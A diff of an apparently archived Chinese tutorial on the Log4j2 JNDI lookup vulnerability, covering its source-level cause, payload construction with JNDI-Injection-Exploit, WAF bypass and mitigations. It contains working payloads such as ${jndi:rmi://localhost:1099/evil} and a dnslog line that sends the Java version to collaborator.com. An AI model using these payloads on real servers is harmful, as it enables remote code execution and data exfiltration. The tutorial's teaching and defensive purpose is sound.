@@ -7,7 +7,7 @@ source: "MrWQ/vulnerability-paper"
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HW2-VRg44ZEFcWxBmDk-CA)
 
-> 本文作者：**lzstar-A2** 个人博客：https://www.cnblogs.com/lzstar/
+> 本文作者：**lzstar-A2** 个人博客：https://www.cnblogs.com/lzstar/
 > 
 > 文章校对：**myh0st**
 
@@ -46,9 +46,9 @@ vmvare
 
 #### 漏洞是怎么回事？
 
-关于漏洞原理可以参考文章 [《Log4j2 研究之 lookup》](https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&mid=2247485584&idx=1&sn=2fad11942986807ea7545f7b8b5d6af8&scene=21#wechat_redirect), 强烈推荐 idea，ctrl 直接点进去看源码，下面是触发漏洞的关键代码：
+关于漏洞原理可以参考文章 [《Log4j2 研究之 lookup》](https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&mid=2247485584&idx=1&sn=2fad11942986807ea7545f7b8b5d6af8&scene=21#wechat_redirect), 强烈推荐 idea，ctrl 直接点进去看源码，下面是触发漏洞的关键代码：
 
-1、org.apache.logging.log4j.core.pattern.MessagePatternConverter 的 `format()` 方法（表达式内容替换）：
+1、org.apache.logging.log4j.core.pattern.MessagePatternConverter 的 `format()` 方法（表达式内容替换）：
 
 ```
 public void format(final LogEvent event, final StringBuilder toAppendTo) {
@@ -93,7 +93,7 @@ public void format(final LogEvent event, final StringBuilder toAppendTo) {
 }
 ```
 
-代码的主要内容就是一旦发现日志中包含 `${` 就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。在 `${` 中可以使用的关键词如下：  
+代码的主要内容就是一旦发现日志中包含 `${` 就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。在 `${` 中可以使用的关键词如下：  
 
 ```
 ${ctx:loginId}
@@ -284,7 +284,7 @@ private int substitute(final LogEvent event, final StringBuilder buf, final int 
 
 总结一下  
 
-日志在打印时当遇到 `${` 后，Interpolator 类以 `:` 号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。
+日志在打印时当遇到 `${` 后，Interpolator 类以 `:` 号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。
 
 #### 知道原理如何构造 Payload 利用
 
@@ -378,9 +378,9 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "C:\Windows\WinSxS\wow6
 
 *   要确保 1099,1389，8180 端口可用，或下载源码在 run.ServerStart 类 26~28 行更改默认端口，再打包成 jar 包运行
     
-*   命令会作为参数传入 `Runtime.getRuntime().exec()`，所以需要确保命令传入 `exec()` 方法可执行。
+*   命令会作为参数传入 `Runtime.getRuntime().exec()`，所以需要确保命令传入 `exec()` 方法可执行。
     
-*   bash 等可在 shell 直接执行的相关命令需要加双引号，比如说 `java -jar JNDI.jar -C "bash -c ..."`
+*   bash 等可在 shell 直接执行的相关命令需要加双引号，比如说 `java -jar JNDI.jar -C "bash -c ..."`
     
 
 3、根据 cmd 日志拼接 log4j2 打印的日志
@@ -466,11 +466,11 @@ public class Server {
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3UYwZ4DqqKaM0icx9I6ib11vP0IlhLVe1YGtmqOl9q2XsSLWjbVvdoibXg/640?wx_fmt=png)
 
-4、在编译好的 EvilObj 目录下 cmd，执行 `python -m http.server 6666` 打开 http 服务（在本地其实不打开也访问的到）
+4、在编译好的 EvilObj 目录下 cmd，执行 `python -m http.server 6666` 打开 http 服务（在本地其实不打开也访问的到）
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3Rg2O6xQgkhuBDDUAOsv0F61CrqicEqSxYcWrpgaiao5BONbkg0reLrTw/640?wx_fmt=png)
 
-5、log4j 的 main 方法打印 
+5、log4j 的 main 方法打印 
 
 > logger.error("${jndi:rmi://localhost:1099/evil}");
 
@@ -480,7 +480,7 @@ public class Server {
 
 ##### 方法三：利用 dnslog 检测并外带数据
 
-1、访问 https://log.xn--9tr.com/，点击 Get SubDomain 获取域名（当然也可以选择其他平台，比如 dnslog、ceye 等）：
+1、访问 https://log.xn--9tr.com/，点击 Get SubDomain 获取域名（当然也可以选择其他平台，比如 dnslog、ceye 等）：
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3ibW1icRWWAMfjaux7gtPdJpB4lsF9JoyFOQE8LjlIApjD15gZ0ln0lnw/640?wx_fmt=png)
 
@@ -541,7 +541,7 @@ ${jndi:ldap://${sys:java.version}.collaborator.com}
 
 #### 对于该漏洞的临时防护怎么做
 
-如果企业已经部署了 WAF 等安全产品，在漏洞爆发之初就应该及时更新规则，临时处置，从而给后续的根治争取时间，从 payload 上看，有几个关键特征:`${`,`jndi`,`ldap`,`rmi`等，但是如果只是拦截 `jndi` 等字符串，很可能没有很好的效果，因为可以进行字符串拼接从而绕过检测，而如果拦截 `${`，又可能造成正常功能无法使用，毕竟可能存在正常请求中包含这个关键词的情况。
+如果企业已经部署了 WAF 等安全产品，在漏洞爆发之初就应该及时更新规则，临时处置，从而给后续的根治争取时间，从 payload 上看，有几个关键特征:`${`,`jndi`,`ldap`,`rmi`等，但是如果只是拦截 `jndi` 等字符串，很可能没有很好的效果，因为可以进行字符串拼接从而绕过检测，而如果拦截 `${`，又可能造成正常功能无法使用，毕竟可能存在正常请求中包含这个关键词的情况。
 
 所以在上临时规则时，要先灰度测试一段时间，才可以全量上规则，否则因为一时的防御，而导致新的问题。下面是一个关于 waf 绕过思路，也可以作为防御的参考：
 
@@ -556,7 +556,7 @@ ${jndi:ldap://${sys:java.version}.collaborator.com}
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3NOoGq84ObABzLoM9moKOIER0XvicmOw6oqtDibKRpY5zOpFkp4yv6Kng/640?wx_fmt=jpeg)
 
-‍2、`${` 关键词拦截（范围大且容易产生误报，且不能真正解决，漏洞的触发点是在打印日志的时候把可控内容携带进去了）  
+‍2、`${` 关键词拦截（范围大且容易产生误报，且不能真正解决，漏洞的触发点是在打印日志的时候把可控内容携带进去了）  
 
 3、为了减少误报，waf 匹配规则参考：
 
@@ -594,7 +594,7 @@ ${jndi:ldap://${sys:java.version}.collaborator.com}
 
 2、限制不必要的业务访问外网
 
-3、设置 JVM 启动参数 - `Dlog4j2.formatMsgNoLookups=true`
+3、设置 JVM 启动参数 - `Dlog4j2.formatMsgNoLookups=true`
 
 4、WAF 添加漏洞攻击代码临时拦截规则创建 “log4j2.component.properties” 文件，文件中增加配置“log4j2.formatMsgNoLookups=true”
 
